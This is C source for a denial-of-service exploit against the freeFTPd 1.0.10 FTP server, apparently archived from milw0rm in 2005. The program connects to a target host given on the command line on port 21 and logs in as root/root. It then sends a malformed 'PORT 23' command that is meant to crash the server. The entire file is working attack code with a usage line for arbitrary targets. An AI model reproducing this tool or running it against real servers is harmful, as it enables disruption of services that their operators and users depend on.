// freeFTPd Denial of Service Attack
// Tested on a Win XP Sp1 Box


#include "stdio.h"
#include "winsock2.h"
#pragma comment (lib,"ws2_32")


#define PORT 21
#define USER "root"
#define PASS "root"
#define L    "--------------------------------------------------"
#define HL   "freeFTPd (1.0.10) DoS Exploit by steve01@chello.at"
#define BOOM "23"

typedef unsigned long ulong;
ulong resolv_host(char *);

int main(int argc, char* argv[])
{

   WSADATA wsa;
   SOCKET s_target;
   struct sockaddr_in addr;
   WORD wsVersion;
   int err=0;

   if(argc<2)
   {
       printf("%s\n",L);
       printf("%s\n",HL);
       printf("%s\n",L);
       printf("Usage: %s <www.target.com>\n",argv[0]);
       exit(0);
   }

   printf("%s\n",L);
   printf("%s\n",HL);
   printf("%s\n",L);


   if(WSAStartup(wsVersion=MAKEWORD(2,2),&wsa))
   {
       printf("Error WSAStartup() Error Code: %d\n",WSAGetLastError());
       exit(1);
   }



   s_target=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
   if(s_target==INVALID_SOCKET)
   {
       printf("Error socket() Error Code: %d\n",WSAGetLastError());
       exit(2);
   }


   addr.sin_family = AF_INET;
   addr.sin_port = htons(PORT);
   addr.sin_addr.s_addr= resolv_host(argv[1]);

   if(connect(s_target,(SOCKADDR *)&addr,sizeof(addr)))
   {
       printf("Error connect() Error Code: %d\n",WSAGetLastError());
       exit(3);
   }

   int recvsize=0;
   char recvbuffer[400];
   char sendbuffer[400];

   //recv banner
   recvsize=recv(s_target,recvbuffer,sizeof(recvbuffer)-1,0);
   recvbuffer[recvsize]='\0';
   //send user
   strncpy(sendbuffer,"USER ",sizeof(sendbuffer)-1);
   strncat(sendbuffer,USER,sizeof(sendbuffer)-strlen(sendbuffer)-1);
   strncat(sendbuffer,"\r\n",sizeof(sendbuffer)-strlen(sendbuffer)-1);

   send(s_target,sendbuffer,strlen(sendbuffer),0);

   //recv user stuff
   recvsize=recv(s_target,recvbuffer,sizeof(recvbuffer)-1,0);
   recvbuffer[recvsize]='\0';

   strncpy(sendbuffer,"PASS ",sizeof(sendbuffer)-1);
   strncat(sendbuffer,PASS,sizeof(sendbuffer)-strlen(sendbuffer)-1);
   strncat(sendbuffer,"\r\n",sizeof(sendbuffer)-strlen(sendbuffer)-1);

   //send pass
   send(s_target,sendbuffer,strlen(sendbuffer),0);

   //recv pass stuff
   recvsize=recv(s_target,recvbuffer,sizeof(recvbuffer)-1,0);
   recvbuffer[recvsize]='\0';

   strncpy(sendbuffer,"PORT ",sizeof(sendbuffer)-1);
   strncat(sendbuffer,BOOM,sizeof(sendbuffer)-strlen(sendbuffer)-1);
   strncat(sendbuffer,"\r\n",sizeof(sendbuffer)-strlen(sendbuffer)-1);
   send(s_target,sendbuffer,strlen(sendbuffer),0);


   closesocket(s_target);
   WSACleanup();



   return 0;
}


ulong resolv_host(char *host)
{

ulong uhost=0;
struct hostent *th;

uhost=inet_addr(host);
if(uhost==INADDR_NONE)
{
 th=gethostbyname(host);
 if(!th)
 {
   printf("Check if %s is up \n",host);
   exit(0);
 }

 uhost=*(unsigned long*)th->h_addr;

}



return uhost;


}

// milw0rm.com [2005-11-24]
